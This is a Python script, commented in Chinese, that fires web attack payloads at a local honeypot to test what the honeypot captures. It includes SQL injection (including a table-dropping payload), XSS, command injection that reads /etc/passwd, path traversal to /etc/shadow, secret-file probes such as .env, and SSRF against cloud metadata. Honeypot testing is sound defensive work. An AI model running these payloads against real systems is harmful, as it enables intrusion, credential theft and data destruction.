# -*- coding: utf-8 -*-
"""
蜜罐攻击模拟脚本
包含多种常见的Web攻击向量，用于测试蜜罐的捕获能力。
"""

import requests
import sys
import time
from urllib.parse import quote

# 目标配置
TARGET_HOST = "http://127.0.0.1:9090"
LOGIN_ENDPOINT = f"{TARGET_HOST}/login"

# 颜色输出配置
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header(msg):
    print(f"\n{Colors.HEADER}{Colors.BOLD}=== {msg} ==={Colors.ENDC}")

def print_success(msg):
    print(f"{Colors.OKGREEN}[+] {msg}{Colors.ENDC}")

def print_info(msg):
    print(f"{Colors.OKBLUE}[*] {msg}{Colors.ENDC}")

def print_error(msg):
    print(f"{Colors.FAIL}[!] {msg}{Colors.ENDC}")

# ==========================================
# 攻击载荷定义 (按漏洞类型分类)
# ==========================================

# 1. 登录接口攻击载荷 (针对 POST /login)
# 格式: {"漏洞类型": [(用户名payload, 密码payload, 描述), ...]}
LOGIN_ATTACKS = {
    "SQL Injection (SQL注入)": [
        ("' OR '1'='1", "admin' --", "万能密码 (单引号闭合)"),
        ("admin", "' OR 1=1#", "密码字段注入 (注释符#)"),
        ("admin' OR 1=1--", "anything", "用户名直接绕过"),
        ("' UNION SELECT 1, 'admin', 'password' --", "123", "联合查询注入"),
        ("admin' AND (SELECT SLEEP(5))--", "123", "时间盲注 (Sleep 5s)"),
        ("admin' AND 1=1--", "123", "布尔盲注 (真)"),
        ("admin' AND 1=0--", "123", "布尔盲注 (假)"),
        ("'; DROP TABLE users; --", "123", "堆叠查询 (删除表)"),
        ("' OR '1'='1' /*", "*/ --", "注释绕过"),
        ("admin' OR '1'='1' LIMIT 1 OFFSET 0--", "pass", "Limit 注入"),
    ],
    "XSS (跨站脚本攻击)": [
        ("<script>alert('XSS')</script>", "123456", "基础 Script 标签"),
        ("admin", "\"><img src=x onerror=alert(1)>", "IMG 标签 onerror 事件"),
        ("<svg/onload=alert(1)>", "password", "SVG onload 事件"),
        ("javascript:alert(1)", "123", "Javascript 伪协议"),
        ("<body onload=alert(1)>", "123", "Body onload 事件"),
        ("<iframe src=javascript:alert(1)>", "123", "Iframe 注入"),
        ("admin", "' onmouseover='alert(1)", "事件处理器注入"),
        ("<img src=x:alert(alt) onerror=eval(src) alt=xss>", "123", "混合 XSS Payload"),
    ],
    "Command Injection (命令注入)": [
        ("admin; ls -la", "123456", "分号分隔 (Linux)"),
        ("admin", "$(cat /etc/passwd)", "命令替换 $()"),
        ("admin | whoami", "password", "管道符 |"),
        ("admin && ipconfig", "123", "逻辑与 && (Windows)"),
        ("admin`whoami`", "123", "反引号执行"),
        ("admin; ping -c 3 127.0.0.1", "123", "Ping 探测"),
        ("admin & dir", "123", "后台执行 & (Windows)"),
        ("admin\nls", "123", "换行符注入"),
    ],
    "NoSQL Injection (NoSQL注入)": [
        ('{"$ne": null}', "password", "不等于 null (MongoDB)"),
        ('{"$gt": ""}', "password", "大于空字符串 (MongoDB)"),
        ("admin", '{"$ne": null}', "密码不等于 null"),
    ],
    "LDAP Injection (LDAP注入)": [
        ("*", "password", "通配符注入"),
        ("admin)(|(password=*)", "123", "LDAP 过滤器绕过"),
        ("admin)(objectClass=*", "123", "Object Class 注入"),
    ]
}

# 2. URL 路径攻击载荷 (针对 GET 请求)
# 格式: {"漏洞类型": [("路径", "描述"), ...]}
URL_ATTACKS = {
    "Path Traversal (路径遍历/LFI)": [
        ("/../../../../etc/passwd", "读取 /etc/passwd (Linux)"),
        ("/..\\..\\..\\windows\\win.ini", "读取 win.ini (Windows)"),
        ("/....//....//....//etc/shadow", "双写绕过"),
        ("/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "URL 编码绕过"),
        ("/var/www/html/../../../../etc/passwd", "绝对路径回溯"),
        ("/boot.ini", "读取 boot.ini"),
        ("/proc/self/environ", "读取环境变量 (LFI)"),
        ("/php://filter/convert.base64-encode/resource=index.php", "PHP 伪协议读取源码"),
    ],
    "Sensitive Files (敏感文件扫描)": [
        ("/admin", "后台管理路径"),
        ("/login.php", "PHP 登录页"),
        ("/robots.txt", "爬虫协议文件"),
        ("/sitemap.xml", "网站地图"),
        ("/.env", "环境配置文件 (Laravel/Node)"),
        ("/.git/HEAD", "Git 仓库暴露"),
        ("/.svn/entries", "SVN 仓库暴露"),
        ("/backup.sql", "数据库备份文件"),
        ("/www.zip", "网站源码备份"),
        ("/phpinfo.php", "PHP 信息泄露"),
        ("/actuator/health", "Spring Boot Actuator"),
        ("/server-status", "Apache Server Status"),
        ("/web.config", "IIS 配置文件"),
    ],
    "Server-Side Request Forgery (SSRF)": [
        ("/?url=http://169.254.169.254/latest/meta-data/", "AWS 元数据服务"),
        ("/?url=file:///etc/passwd", "File 协议读取"),
        ("/?url=http://127.0.0.1:22", "本地端口扫描"),
        ("/?url=gopher://127.0.0.1:6379/_", "Gopher 协议探测"),
    ]
}

# ==========================================
# 测试执行逻辑
# ==========================================

def check_alive():
    """检查蜜罐是否存活"""
    print_header("正在检查目标存活状态")
    try:
        response = requests.get(TARGET_HOST, timeout=5)
        if response.status_code == 200:
            print_success(f"目标 {TARGET_HOST} 在线")
            return True
        else:
            print_error(f"目标返回非 200 状态码: {response.status_code}")
            return True # 依然继续测试，因为可能是 403/404 等
    except requests.exceptions.ConnectionError:
        print_error(f"无法连接到目标 {TARGET_HOST}。请确保蜜罐服务已启动。")
        return False
    except Exception as e:
        print_error(f"连接检查发生异常: {e}")
        return False

def run_login_attacks():
    """执行登录接口攻击测试"""
    for category, payloads in LOGIN_ATTACKS.items():
        print_header(f"测试分类: {category}")
        
        for username, password, desc in payloads:
            try:
                data = {'username': username, 'password': password}
                # 发送请求
                start_time = time.time()
                response = requests.post(LOGIN_ENDPOINT, data=data, timeout=3)
                elapsed = (time.time() - start_time) * 1000
                
                status_code = response.status_code
                
                # 格式化输出
                print(f"  Payload: User={username[:20]}... Pass={password[:10]}... | {desc}")
                print(f"    -> Status: {status_code} | Time: {elapsed:.2f}ms")
                
            except Exception as e:
                print_error(f"    请求失败: {e}")
            
            # 简单的延时，避免过快
            # time.sleep(0.1) 

def run_url_attacks():
    """执行 URL 路径攻击测试"""
    for category, payloads in URL_ATTACKS.items():
        print_header(f"测试分类: {category}")
        
        for path, desc in payloads:
            try:
                full_url = f"{TARGET_HOST}{path}"
                
                start_time = time.time()
                response = requests.get(full_url, timeout=3)
                elapsed = (time.time() - start_time) * 1000
                
                status_code = response.status_code
                
                print(f"  Path: {path[:40]:<40} | {desc}")
                print(f"    -> Status: {status_code} | Time: {elapsed:.2f}ms")
                
            except Exception as e:
                print_error(f"    请求失败: {e}")

def main():
    print(f"{Colors.BOLD}=== 蜜罐全方位攻击模拟脚本启动 ==={Colors.ENDC}")
    print(f"目标: {TARGET_HOST}")
    print(f"时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}")
    
    if not check_alive():
        sys.exit(1)
        
    # 执行 POST 登录攻击
    run_login_attacks()
    
    # 执行 GET URL 攻击
    run_url_attacks()
    
    print_header("测试结束")
    print_success("所有攻击模拟已完成。请检查蜜罐日志和后台记录。")

if __name__ == "__main__":
    main()
